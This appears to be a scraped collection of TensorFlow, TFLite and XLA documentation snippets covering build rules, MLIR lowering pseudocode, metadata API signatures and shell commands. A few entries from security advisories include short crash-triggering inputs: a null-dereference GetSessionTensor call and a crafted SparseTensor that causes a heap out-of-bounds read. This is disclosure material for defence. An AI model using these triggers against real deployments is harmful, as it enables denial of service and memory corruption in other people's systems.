DESCRIPTION: This Bazel `cc_binary` rule defines a new executable target named "benchmark_model_plus_custom_ops". It includes the standard TensorFlow Lite benchmark tool's main entry point and links it with a custom library target (`:my_custom_ops_provider`) that provides the implementation for user-defined operations. This allows the benchmark tool to recognize and execute custom ops present in a TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/README.md#_snippet_4

LANGUAGE: Bazel
CODE:
```
cc_binary(
    name = "benchmark_model_plus_custom_ops",
    deps = [
        ":my_custom_ops_provider",
        "//tensorflow/lite/tools/benchmark:benchmark_model_main",
    ],
)
```

----------------------------------------

TITLE: Convert JSON to Flatbuffer Binary using flatc (Shell)
DESCRIPTION: Compile the modified JSON database file (`gpu_compatibility.json`) back into a binary flatbuffer format (`gpu_compatibility.bin`) using the `flatc` tool and the schema (`database.fbs`). The `-b` option signifies compilation to binary format.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/experimental/acceleration/compatibility/README.md#_snippet_1

LANGUAGE: shell
CODE:
```
flatc -b database.fbs -- gpu_compatibility.json
```

----------------------------------------

TITLE: Processing Batch Size in TFLite BatchToSpaceNd Kernel (C++)
DESCRIPTION: This C++ snippet from the TFLite BatchToSpaceNd kernel shows the code responsible for checking divisibility and then dividing the output batch size by a dimension of the block shape. A vulnerability exists here if `block_shape[dim]` is zero, leading to a division-by-zero runtime error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-084.md#_snippet_0

LANGUAGE: cc
CODE:
```
TF_LITE_ENSURE_EQ(context, output_batch_size % block_shape[dim], 0);
output_batch_size = output_batch_size / block_shape[dim];
```

----------------------------------------

TITLE: Lowering tfl.average_pool_2d (Quantized) to TOSA MLIR
DESCRIPTION: Documents the lowering of the quantized TensorFlow Lite `tfl.average_pool_2d` operation to the TOSA dialect's `tosa.AVG_POOL2D`. It includes kernel size, stride, padding attributes, quantization info (input/output zero points), and optional handling for fused activation functions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_55

LANGUAGE: MLIR
CODE:
```
%output = tfl.average_pool_2d(%input) {filter_height, filter_width, padding, stride_h, stride_w, fused_activation_function}
```

LANGUAGE: MLIR
CODE:
```
%avgpool2d = tosa.AVG_POOL2D(%input) {kernel={filter_height, filter_width}, stride={stride_h, stride_w}, padding=tosa_padding, quantization_info={input_zp=%input.zp, output_zp=%output.zp}}
if(fused_activation != NONE) {
    %result = convert_fused_activation(%avgpool2d, fused_activation)
}
else {
    %result = %avgpool2d
}
```

----------------------------------------

TITLE: Add Input Process Units to Subgraph Metadata (Python)
DESCRIPTION: Adds a list of input processing units to the subgraph metadata within a FlatBuffer builder. This function is typically called during the construction of TFLite metadata using the FlatBuffers Python API. It requires an active FlatBuffer builder and an offset or list of offsets representing the input processing units to be associated with the subgraph.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataAddInputProcessUnits.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataAddInputProcessUnits(
    builder, inputProcessUnits
)
```

----------------------------------------

TITLE: Initializing ScoreThresholdingOptionsT in Python
DESCRIPTION: This is the constructor for the `ScoreThresholdingOptionsT` class within the TFLite Support metadata schema module. It is used to create new instances of the class without requiring any parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreThresholdingOptionsT.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ScoreThresholdingOptionsT()
```

----------------------------------------

TITLE: Accessing Specific Min Value in Python
DESCRIPTION: This instance method allows accessing a specific minimum value by its index `j` from the statistical data within the buffer. It retrieves the value at the given position.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/Stats.md#_snippet_7

LANGUAGE: Python
CODE:
```
Min(
    j
)
```

----------------------------------------

TITLE: Lowering SelectV2 Operation to TOSA (MLIR)
DESCRIPTION: This function lowers a select_v2 operation to the TOSA dialect. It ensures the condition tensor has the same rank as the output shape by prepending dimensions of size 1 if necessary to support broadcasting. It then uses the TOSA SELECT operation with the potentially reshaped condition and the true/false tensors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_20

LANGUAGE: MLIR/TOSA
CODE:
```
Value lower_selectv2_op(Value %condition, Value %t, Value %e, shape output_shape)
{
    // Reshape condition so that ranks match to support
    // broadcasting (if necessary)

    if (%condition.rank != output_shape.size) {
       vector <size_t> cond_shape = %condition.shape
       for (int32 i = 0; i < (output_shape.size - %condition.rank); i++) {
           cond_shape.push_front(1)
       }

       %condition = tosa.RESHAPE(%condition) {new_shape=cond_shape}
    }

    %output = tosa.SELECT(%condition, %t, %e)

    return %output
}
```

----------------------------------------

TITLE: Push COCO Validation Data to Android Device - Shell
DESCRIPTION: Creates a directory (`coco_validation`) under `/data/local/tmp` on the Android device and then transfers the preprocessed COCO validation data (images and `ground_truth.pb`) from the local output folder to this new directory using ADB.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/coco_object_detection/README.md#_snippet_6

LANGUAGE: Shell
CODE:
```
adb shell mkdir /data/local/tmp/coco_validation && \
adb push /path/to/output/folder /data/local/tmp/coco_validation
```

----------------------------------------

TITLE: Starting Output Process Units Vector - TFLite Metadata - Python
DESCRIPTION: This Python function is used to signal the start of constructing a vector of `OutputProcessUnit` objects within a FlatBuffers builder context. It's typically called when building metadata for a TFLite subgraph. The `builder` is the FlatBuffers builder instance, and `numElems` specifies the expected number of elements that will be added to the vector.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataStartOutputProcessUnitsVector.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataStartOutputProcessUnitsVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Starting Flatbuffers Vector Build Python
DESCRIPTION: This snippet shows the function signature for `StatsStartMinVector`, used internally in the Flatbuffers serialization process. It takes a Flatbuffers `builder` instance and the `numElems` for the vector being created. This function prepares the builder to write a vector field, specifically for the 'min' vector within a 'Stats' object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/StatsStartMinVector.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.StatsStartMinVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Building MLIR MhloToArithmeticConversion Library (CMake)
DESCRIPTION: Defines a CMake target for the MhloToArithmeticConversion library. This library contains MLIR passes and patterns for converting MHLO dialect operations into the Arithmetic and SCF dialects, listing the source file and necessary dependencies.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/transforms/CMakeLists.txt#_snippet_9

LANGUAGE: CMake
CODE:
```
add_mlir_library(MhloToArithmeticConversion
  hlo_legalize_to_arithmetic/hlo_legalize_to_arithmetic.cc

  DEPENDS
  MLIRhlo_opsIncGen
  MLIRMhloPassIncGen

  LINK_COMPONENTS
  Core

  LINK_LIBS PUBLIC
  MhloDialect
  MhloTypeConversion
  MLIRIR
  MLIRPass
  MLIRMathDialect
  MLIRSCFDialect
  MLIRTransforms
  MLIRTransformUtils
)
```

----------------------------------------

TITLE: Initializing RegexTokenizerOptionsT from Object Python
DESCRIPTION: A class method to initialize a `RegexTokenizerOptionsT` object from another `RegexTokenizerOptionsT` object instance. This can be used to create a copy or perform transformations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/RegexTokenizerOptionsT.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
InitFromObj(
    regexTokenizerOptions
)
```

----------------------------------------

TITLE: Example 1D Slice operation (C++)
DESCRIPTION: Illustrates a one-dimensional Slice operation using conceptual C++ syntax. It takes an array 'a' and extracts a sub-array starting from index 2 up to (but not including) index 4, resulting in the elements {2.0, 3.0}.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_35

LANGUAGE: C++
CODE:
```
let a = {0.0, 1.0, 2.0, 3.0, 4.0}
Slice(a, {2}, {4}) produces:
  {2.0, 3.0}
```

----------------------------------------

TITLE: Calling GetSessionTensor Raw Op in Eager Mode (Python)
DESCRIPTION: This Python snippet demonstrates how to call the `tf.raw_ops.GetSessionTensor` operation in TensorFlow's eager mode. In affected versions, calling this raw op when session state is invalid triggers a null pointer dereference, exposing the TFSA-2021-007 vulnerability. It requires a handle and a dtype.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-007.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
tf.raw_ops.GetSessionTensor(handle=['\x12\x1a\x07'],dtype=4)
```

----------------------------------------

TITLE: Collect Core Benchmark Source Files (CMake)
DESCRIPTION: This snippet populates the `TFLITE_BENCHMARK_SRCS` variable with source files from the benchmark directory, excluding test files and performance options source on Windows, and then appends additional required utility and profiling source files to the list.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
populate_source_vars("${TFLITE_SOURCE_DIR}/tools/benchmark"
  TFLITE_BENCHMARK_SRCS
  FILTER "(_test|_plus_flex_main|_performance_options.*)\\.cc$"
)
list(APPEND TFLITE_BENCHMARK_SRCS
  ${XLA_SOURCE_DIR}/xla/tsl/util/stats_calculator.cc
  ${TFLITE_SOURCE_DIR}/kernels/internal/utils/sparsity_format_converter.cc
  ${TFLITE_SOURCE_DIR}/profiling/memory_info.cc
  ${TFLITE_SOURCE_DIR}/profiling/memory_usage_monitor.cc
  ${TFLITE_SOURCE_DIR}/profiling/model_runtime_info.cc
  ${TFLITE_SOURCE_DIR}/profiling/profile_buffer.cc
  ${TFLITE_SOURCE_DIR}/profiling/profile_summarizer.cc
  ${TFLITE_SOURCE_DIR}/profiling/profile_summary_formatter.cc
  ${TFLITE_SOURCE_DIR}/profiling/root_profiler.cc
  ${TFLITE_SOURCE_DIR}/profiling/telemetry/profiler.cc
  ${TFLITE_SOURCE_DIR}/profiling/telemetry/telemetry.cc
  ${TFLITE_SOURCE_DIR}/profiling/time.cc
  ${TFLITE_SOURCE_DIR}/tools/command_line_flags.cc
  ${TFLITE_SOURCE_DIR}/tools/delegates/default_execution_provider.cc
  ${TFLITE_SOURCE_DIR}/tools/delegates/delegate_provider.cc
  ${TFLITE_SOURCE_DIR}/tools/evaluation/utils.cc
  ${TFLITE_SOURCE_DIR}/tools/model_loader.cc
  ${TFLITE_SOURCE_DIR}/tools/tool_params.cc
  ${TFLITE_SOURCE_DIR}/tools/utils.cc
)
```

----------------------------------------

TITLE: Reading Composite Resource Variable MLIR
DESCRIPTION: Example showing a `tf.ReadVariableOp` operating on a resource variable with a composite device assignment (like packed tensors) within a `tf_device.replicate` region in MLIR. This represents the structure before the colocation pass.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_50

LANGUAGE: mlir
CODE:
```
  %0 = "tf.ReadVariableOp"(%arg1) : (tensor<*x!tf_type.resource<tensor<4xf32>>>) -> tensor<4xf32>
```

----------------------------------------

TITLE: Adding Content Properties using TFLite Support Python
DESCRIPTION: This Python code snippet shows the signature of the `ContentAddContentProperties` function. It is used with a FlatBuffer builder (`builder`) to add content properties (`contentProperties`) to the schema. It is likely a utility function for constructing the metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ContentAddContentProperties.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ContentAddContentProperties(
    builder, contentProperties
)
```

----------------------------------------

TITLE: Initializing ImageSizeT from Buffer in Python
DESCRIPTION: Class method to initialize an `ImageSizeT` object by reading data from a FlatBuffers buffer (`buf`) starting at a specific position (`pos`). This is used to deserialize the object from its binary representation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageSizeT.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod\nInitFromBuf(\n buf, pos\n)
```

----------------------------------------

TITLE: Starting Max Vector in TFLite Metadata Schema Builder (Python)
DESCRIPTION: This function initializes the process of adding a vector for maximum statistics within the FlatBuffers builder context. It must be called before adding the elements of the vector. It requires the FlatBuffers builder object and the number of elements the vector will contain.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/StatsStartMaxVector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.StatsStartMaxVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Generating TF2XLA Supported Ops List - Shell
DESCRIPTION: This shell command executes the Bazel build tool to run the `tf2xla_supported_ops` utility. It compiles the tool with optimization enabled (`-c opt`) and specifies `XLA_GPU_JIT` to get the list of operations and supported data types for TensorFlow compiled to XLA for GPU.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/tf2xla/g3doc/gpu_supported_ops.md#_snippet_0

LANGUAGE: shell
CODE:
```
bazel run -c opt -- tensorflow/compiler/tf2xla:tf2xla_supported_ops --device=XLA_GPU_JIT
```

----------------------------------------

TITLE: Ending Score Calibration Options Definition Python
DESCRIPTION: Finalizes the definition of a ScoreCalibrationOptions table using a FlatBuffers builder. This function is typically called after adding all necessary fields to the table, marking its completion in the schema construction process. It requires a FlatBuffers builder object as input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreCalibrationOptionsEnd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ScoreCalibrationOptionsEnd(
    builder
)
```

----------------------------------------

TITLE: Implementing Reduce Operation - Python Pseudocode
DESCRIPTION: This pseudocode demonstrates a possible implementation approach for the XLA Reduce operation using summation. It iterates over the dimensions not being reduced to initialize result elements and then iterates over reduction dimensions, accumulating values from the input operand into the corresponding result element.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_25

LANGUAGE: Python
CODE:
```
result_shape <- remove all dims in dimensions from operand_shape

# Iterate over all elements in result_shape. The number of r's here is equal
# to the number of dimensions of the result.
for r0 in range(result_shape[0]), r1 in range(result_shape[1]), ...:
  # Initialize this result element
  result[r0, r1...] <- 0

  # Iterate over all the reduction dimensions
  for d0 in range(dimensions[0]), d1 in range(dimensions[1]), ...:
    # Increment the result element with the value of the operand's element.
    # The index of the operand's element is constructed from all ri's and di's
    # in the right order (by construction ri's and di's together index over the
    # whole operand shape).
    result[r0, r1...] += operand[ri... di]
```

----------------------------------------

TITLE: Dereferencing TensorFlow session state in C++
DESCRIPTION: This C++ snippet shows the line of code within the TensorFlow core kernel that causes a null pointer dereference. In eager mode, `ctx->session_state()` returns `nullptr`, leading to a segmentation fault when `GetNewId()` is called on it. This occurs when session-only operations are invoked without a valid session state.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-012.md#_snippet_0

LANGUAGE: C++
CODE:
```
  int64 id = ctx->session_state()->GetNewId();
```

----------------------------------------

TITLE: Get Name to Features Method Python
DESCRIPTION: Retrieves a dictionary describing the features expected by the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/BertClassifierSpec.md#_snippet_6

LANGUAGE: python
CODE:
```
get_name_to_features()
```

----------------------------------------

TITLE: Finalizing Bert Tokenizer Options - TFLite Support Python
DESCRIPTION: This snippet shows the signature of the `BertTokenizerOptionsEnd` function in the TensorFlow Lite Support library. This function is used in Python to finalize the construction of a `BertTokenizerOptions` object within a FlatBuffers builder, returning the offset of the finished object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BertTokenizerOptionsEnd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.BertTokenizerOptionsEnd(
    builder
)
```

----------------------------------------

TITLE: Add Standard Deviation to NormalizationOptions - Python
DESCRIPTION: This Python function, likely generated from a FlatBuffers schema, is used to add the standard deviation (`std`) value when constructing a `NormalizationOptions` object. It takes a FlatBuffers `builder` object and the `std` value as input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptionsAddStd.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.NormalizationOptionsAddStd(
    builder, std
)
```

----------------------------------------

TITLE: Adding SubGraph Metadata Name in Python
DESCRIPTION: This function is part of the FlatBuffers builder process for TFLite metadata. It is used to add the 'name' string field to a `SubGraphMetadata` object within a FlatBuffers buffer, typically called after `SubGraphMetadataStart` and before `SubGraphMetadataEnd`. It requires the FlatBuffers builder instance and the string value for the name.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataAddName.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataAddName(
    builder, name
)
```

----------------------------------------

TITLE: Initializing AudioPropertiesT From Object - Python
DESCRIPTION: This class method initializes an `AudioPropertiesT` object from another existing `audioProperties` object. It likely serves as a copy constructor or a way to initialize from a different representation of the audio properties data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AudioPropertiesT.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
InitFromObj(
    audioProperties
)

```

----------------------------------------

TITLE: Getting Tensor Names Count | TensorFlow Lite Support Python
DESCRIPTION: Returns the number of tensor names available in the `TensorNames` list for this group. This indicates how many tensors are included in the group.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorGroup.md#_snippet_7

LANGUAGE: python
CODE:
```
TensorNamesLength()
```

----------------------------------------

TITLE: Implementing While Loop in XLA (C++)
DESCRIPTION: This pseudocode snippet illustrates the structure of an XLA `While` loop computation. It shows how an initial value (`init`) is iteratively updated by a `body` computation as long as a `condition` computation returns true. The example demonstrates a loop that increments a counter and accumulates a vector.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_38

LANGUAGE: C++
CODE:
```
// Pseudocode for the computation.
init = {0, zero_vector[10]} // Tuple of int32 and float[10].
result = init;
while (result(0) < 1000) {
  iteration = result(0) + 1;
  new_vector = result(1) + constant_vector[10];
  result = {iteration, new_vector};
}
```

----------------------------------------

TITLE: Triggering Heap Out of Bounds Access in TensorFlow Sparse Reduction (Python)
DESCRIPTION: This Python snippet demonstrates how to create a specific tf.SparseTensor input that triggers the heap out-of-bounds access vulnerability when processed by tf.sparse.reduce_sum. The crafted indices and dense_shape exploit the lack of proper validation in the reduction kernel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-109.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

x = tf.SparseTensor(
      indices=[[773, 773, 773], [773, 773, 773]],
      values=[1, 1],
      dense_shape=[337, 337, 337])
tf.sparse.reduce_sum(x, 1)
```

----------------------------------------

TITLE: Starting FeatureProperties Definition in TFLite Metadata (Python)
DESCRIPTION: This function is part of the TensorFlow Lite metadata schema generation API. It is used to start defining a `FeatureProperties` structure within a FlatBuffers builder. It takes a `builder` object as input, which is used to construct the FlatBuffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/FeaturePropertiesStart.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.FeaturePropertiesStart(\n    builder\n)
```

----------------------------------------

TITLE: MLIR TPU Resource Partitioning Pass: Before
DESCRIPTION: This MLIR snippet illustrates the IR state before the `-tf-tpu-resource-partition` pass. It depicts `tf.ReadVariableOp` and `tf.AssignVariableOp` operating on a single aggregated resource handle produced by `tf.TPUPartitionedInput`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_59

LANGUAGE: MLIR
CODE:
```
func @cluster(%arg0: tensor<!tf_type.resource<tensor<i32>>>, %arg1: tensor<!tf_type.resource<tensor<i32>>>) {
  %partitioned_variable = "tf.TPUPartitionedInput"(%arg0, %arg1) {N = 2 : i64, _XlaSharding = "", partition_dim = -1 : i64} : (tensor<!tf_type.resource<tensor<i32>>>, tensor<!tf_type.resource<tensor<i32>>>) -> tensor<!tf_type.resource<tensor<i32>>>
  %read = "tf.ReadVariableOp"(%partitioned_variable) : (tensor<!tf_type.resource<tensor<i32>>>) -> tensor<i32>
  %computation = "tf_device.cluster_func"(%read) {func = @computation, use_spmd_for_xla_partitioning = true} : (tensor<i32>) -> tensor<i32>
  "tf.AssignVariableOp"(%partitioned_variable, %computation) : (tensor<!tf_type.resource<tensor<i32>>>, tensor<i32>) -> ()
  return
}

func @computation(%arg0: tensor<i32>) -> tensor<i32> {
  return %arg0: tensor<i32>
}
```

----------------------------------------

TITLE: Starting Score Calibration Options Build with TFLite Metadata (Python)
DESCRIPTION: This snippet shows the Python function signature for `ScoreCalibrationOptionsStart`. This function is used to begin the process of building a `ScoreCalibrationOptions` object within the FlatBuffers serialization framework. It takes a `builder` object, typically an instance of a FlatBuffer builder, as its only argument to prepare for adding fields to the table.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreCalibrationOptionsStart.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ScoreCalibrationOptionsStart(
    builder
)
```

----------------------------------------

TITLE: Adding Content Properties Type using TFLite Metadata Builder (Python)
DESCRIPTION: This Python snippet shows the function signature for `ContentAddContentPropertiesType`. It's used to add content properties type information to a FlatBuffers builder object, likely as part of the process of building metadata for a TFLite model. The function takes the `builder` object and the `contentPropertiesType` enum value as arguments.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ContentAddContentPropertiesType.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ContentAddContentPropertiesType(
    builder, contentPropertiesType
)
```

----------------------------------------

TITLE: Cross-Build TFLite Pip with Bazel - aarch64 Python 3.9 (Shell)
DESCRIPTION: Executes the `ci_build.sh` script using the `PI-PYTHON39` profile to prepare the Docker build environment. It then runs the `build_pip_package_with_bazel.sh` script within Docker, targeting the `aarch64` architecture for Python 3.9.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/pip_package/README.md#_snippet_12

LANGUAGE: sh
CODE:
```
tensorflow/tools/ci_build/ci_build.sh PI-PYTHON39 \
  tensorflow/lite/tools/pip_package/build_pip_package_with_bazel.sh aarch64
```

----------------------------------------

TITLE: Packing StatsT Data Python
DESCRIPTION: This method serializes the current state of the `StatsT` object into a provided `builder` object. This process is typically used to prepare the statistical data for storage or transmission in a specific format, such as FlatBuffers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/StatsT.md#_snippet_4

LANGUAGE: Python
CODE:
```
Pack(
    builder
)
```

----------------------------------------

TITLE: Add Minimum Value to TFLite Metadata ValueRange Python
DESCRIPTION: This snippet shows the call signature for the `ValueRangeAddMin` function.
This function is designed to be used with a FlatBuffer builder (`builder`) to set the `min` field of a `ValueRange` table.
It takes the builder instance and the integer minimum value as arguments.
This is a low-level function used during the FlatBuffer construction process for TFLite metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ValueRangeAddMin.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.ValueRangeAddMin(\n    builder, min\n)
```

----------------------------------------

TITLE: Downloading Preprocessed CSV Data (Python/Shell)
DESCRIPTION: Downloads pre-generated CSV files for the training and test datasets from specified URLs using `wget`. This is executed if the `is_skip_step_1` flag is set to True, bypassing the image preprocessing step.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_11

LANGUAGE: Python
CODE:
```
# Download the preprocessed CSV files which are the same as the output of step 1
if is_skip_step_1:
  !wget -O train_data.csv http://download.tensorflow.org/data/pose_classification/yoga_train_data.csv
  !wget -O test_data.csv http://download.tensorflow.org/data/pose_classification/yoga_test_data.csv

  csvs_out_train_path = 'train_data.csv'
  csvs_out_test_path = 'test_data.csv'
  is_skipped_step_1 = True
```

----------------------------------------

TITLE: Cloning TensorFlow Repository
DESCRIPTION: Clones the official TensorFlow repository from GitHub into a directory named `tensorflow_src`. This repository contains the source code for TensorFlow Lite and the minimal example.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/minimal/README.md#_snippet_2

LANGUAGE: sh
CODE:
```
git clone https://github.com/tensorflow/tensorflow.git tensorflow_src
```

----------------------------------------

TITLE: Cloning XLA Repository Fork (Shell)
DESCRIPTION: Clones the user's forked XLA repository from GitHub using Git. Requires replacing `{USER}` with the actual GitHub username. This command fetches the source code locally onto your machine.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/developer_guide.md#_snippet_0

LANGUAGE: sh
CODE:
```
git clone https://github.com/{USER}/xla.git
```

----------------------------------------

TITLE: Accessing Content Properties Type Python
DESCRIPTION: Retrieves the type of the properties associated with the Content object. This helps in determining the specific kind of content-related metadata present.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/Content.md#_snippet_2

LANGUAGE: python
CODE:
```
ContentPropertiesType()
```

----------------------------------------

TITLE: Checking for Input Process Units in Python
DESCRIPTION: Checks if the input process units field is present or null within the schema. Use this method to verify if input process units exist.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_11

LANGUAGE: python
CODE:
```
InputProcessUnitsIsNone()
```

----------------------------------------

TITLE: Retrieving Description in Python
DESCRIPTION: Retrieves the description string from the metadata schema. This method provides access to the descriptive text associated with the metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_6

LANGUAGE: python
CODE:
```
Description()
```

----------------------------------------

TITLE: Bazel Build Rule for Delegate Provider Library
DESCRIPTION: This Bazel `cc_library` rule defines a C++ library for the dummy delegate provider. The `alwayslink = 1` attribute is crucial to prevent the linker from optimizing the library away, ensuring the delegate provider is registered at startup.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/implementing_delegate.md#_snippet_4

LANGUAGE: Bazel
CODE:
```
#### The following are for using the dummy test delegate in TFLite tooling ####
cc_library(
    name = "dummy_delegate_provider",
    srcs = ["dummy_delegate_provider.cc"],
    copts = tflite_copts(),
    deps = [
        ":dummy_delegate",
        "//tensorflow/lite/tools/delegates:delegate_provider_hdr",
    ],
    alwayslink = 1, # This is required so the optimizer doesn't optimize the library away.
)
```

----------------------------------------

TITLE: Configuring MLIR Bridge in TF 1.x Python
DESCRIPTION: This snippet demonstrates how to enable the experimental MLIR-based TPU bridge within a TensorFlow 1.x session configuration. It involves setting the `enable_mlir_bridge` flag to `True` inside the `experimental` attribute of the `tf.ConfigProto` object. This configuration is typically used when creating or configuring a TensorFlow session.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tensorflow/g3doc/enable_mlir_bridge.md#_snippet_0

LANGUAGE: Python
CODE:
```
session_config = tf.ConfigProto(
  ......
  experimental=tf.ConfigProto.Experimental(
    enable_mlir_bridge=True,
  ),
  ......
)
```

----------------------------------------

TITLE: Value Representation for OpResolverType.BUILTIN_WITHOUT_DEFAULT_DELEGATES in Python
DESCRIPTION: This snippet shows the internal representation of the `BUILTIN_WITHOUT_DEFAULT_DELEGATES` value. This type uses optimized built-in kernels but explicitly disables the automatic application of default delegates like XNNPACK, and is generally not recommended unless specific delegate issues arise.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/experimental/OpResolverType.md#_snippet_3

LANGUAGE: Python
CODE:
```
<OpResolverType.BUILTIN_WITHOUT_DEFAULT_DELEGATES: 3>
```

----------------------------------------

TITLE: Creating BertTokenizerOptionsT from Packed Buffer - Python
